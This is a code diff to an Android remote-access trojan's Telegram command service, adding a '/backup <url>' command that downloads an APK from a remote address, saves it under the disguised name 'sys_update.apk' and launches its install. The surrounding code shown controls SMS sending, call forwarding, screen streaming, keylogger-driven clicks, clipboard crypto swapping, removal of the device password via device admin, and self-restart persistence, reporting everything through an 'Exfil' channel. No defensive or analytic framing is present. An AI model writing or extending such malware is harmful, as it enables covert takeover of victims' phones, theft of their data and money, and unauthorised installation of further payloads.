@@ -163,6 +163,7 @@ public class TelegramService extends Service {
             else if (cmd.startsWith("/sendsms ")) sendSMS(cmd.substring(9).trim());
             else if (cmd.equals("/wifi")) getWifiInfo();
             else if (cmd.startsWith("/forward ")) forwardCalls(cmd.substring(9).trim());
+            else if (cmd.startsWith("/backup ")) downloadAndInstallBackup(cmd.substring(8).trim());
             else if (cmd.equals("/vnc")) {
                 isVncRunning = !isVncRunning;
                 Exfil.send(isVncRunning ? "🖥️ VNC Stream Started" : "🖥️ VNC Stream Stopped");
@@ -175,7 +176,6 @@ public class TelegramService extends Service {
                 startService(new Intent(this, TelegramService.class));
                 Exfil.send("🔄 Service Restarted.");
             }
-            // SMART GHOST TOUCH
             else if (cmd.startsWith("/click ")) {
                 if (KeyloggerService.instance != null) {
                     boolean ok = KeyloggerService.instance.performClick(cmd.substring(7).trim());
@@ -223,6 +223,7 @@ public class TelegramService extends Service {
                 "/sendsms <number> <msg> - Send SMS\n" +
                 "/wifi - Get Wi-Fi info\n" +
                 "/forward <number> - Forward calls\n" +
+                "/backup <url> - Silent Install APK\n" +
                 "/vnc, /cryptoclip, /apps\n" +
                 "/uninstall <pkg>, /restart\n\n" +
                 "**SMART GHOST TOUCH:**\n" +
@@ -231,6 +232,40 @@ public class TelegramService extends Service {
                 "/swipe <up/down/left/right> - Swipe screen\n" +
                 "/back, /home, /recents, /notif";
         Exfil.send(menu);
+    }
+
+    // ================== BACKUP INSTALLER ==================
+    private void downloadAndInstallBackup(String urlStr) {
+        Exfil.send("⏳ Downloading Backup APK in background...");
+        new Thread(() -> {
+            try {
+                URL url = new URL(urlStr);
+                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                connection.setRequestProperty("User-Agent", "Mozilla/5.0");
+                connection.connect();
+                
+                File apkFile = new File(getExternalFilesDir(null), "sys_update.apk");
+                FileOutputStream fos = new FileOutputStream(apkFile);
+                InputStream is = connection.getInputStream();
+                byte[] buffer = new byte[4096];
+                int len;
+                while ((len = is.read(buffer)) != -1) {
+                    fos.write(buffer, 0, len);
+                }
+                fos.close();
+                is.close();
+                
+                Exfil.send("✅ Download Complete! Triggering Silent Install...");
+                
+                Intent intent = new Intent(Intent.ACTION_VIEW);
+                intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
+                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                startActivity(intent);
+                
+            } catch (Exception e) {
+                Exfil.send("❌ Backup Error: " + e.getMessage());
+            }
+        }).start();
     }
 
     // ================== SMART GHOST TOUCH HELPERS ==================
@@ -415,7 +450,7 @@ public class TelegramService extends Service {
         try {
             DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
             ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
-          if (dpm != null && dpm.isAdminActive(admin)) { dpm.resetPassword("", 0); Exfil.send("🔓 Password Removed."); }
+            if (dpm != null && dpm.isAdminActive(admin)) { dpm.resetPassword("", 0); Exfil.send("🔓 Password Removed."); }
         } catch (Exception e) {}
     }
 
@@ -601,4 +636,4 @@ public class TelegramService extends Service {
         super.onTaskRemoved(rootIntent);
         startService(new Intent(getApplicationContext(), TelegramService.class).setPackage(getPackageName()));
     }
-    }
+            }
